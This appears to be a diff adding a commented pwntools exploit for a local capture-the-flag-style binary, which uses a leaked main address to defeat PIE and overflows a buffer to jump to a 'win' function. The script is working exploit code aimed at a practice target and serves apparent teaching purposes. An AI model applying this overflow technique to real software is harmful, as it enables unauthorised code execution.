@@ -1,0 +1,23 @@
+from pwn import *
+
+context.update(arch='i386',os='linux')
+elf=ELF('./32gotpie_enabled')
+
+proc=process('./32gotpie_enabled')
+
+d=proc.recvline()                                     # we get the main address from the program itself ( easiest case)
+main=d[d.decode().find(":")+2:-1].decode()
+main=int(main,16)
+
+base=hex(main-int('0x11bd',16))                        # subtract the offset from the received main address to find the base address of the program . offset can be found from disassembled program
+base=int(base,16)
+
+win=base+int('0x1219',16)                             # now add the offset of win to base to get the address of win function
+
+
+offset=b'A'*32
+payload=offset+p32(win)                             # buffer overflow 
+proc.sendline(payload)
+d=proc.recvuntil("D")
+print(d)
+
